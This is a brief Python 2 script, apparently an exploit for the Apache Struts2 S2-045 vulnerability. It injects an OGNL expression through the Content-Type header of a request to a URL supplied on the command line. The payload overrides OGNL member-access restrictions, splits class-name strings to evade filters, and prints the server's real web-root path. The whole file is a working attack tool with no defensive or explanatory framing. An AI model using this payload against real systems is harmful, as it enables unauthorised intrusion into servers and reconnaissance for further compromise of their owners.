#!/usr/bin/python
# -*- coding: utf-8 -*-
# author HWHXY

import urllib2
import httplib


def exploit(url):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "(#context.setMemberAccess(#dm)))."
    payload += "(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
    payload += "(#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'))."
    payload += "(#a=#req.getSession())."
    payload += "(#b=#a.getServletContext())."
    payload += "(#c=#b.getRealPath('/'))."
    payload += "(#o.println(#c))."
    payload += "(#o.close())}"

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead, e:
        page = e.partial

    print(page)
    return page


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("[*] s-045_load_bypass.py <url>")
    else:
        print('[*] bypass and get the real path')
        url = sys.argv[1]
        exploit(url)
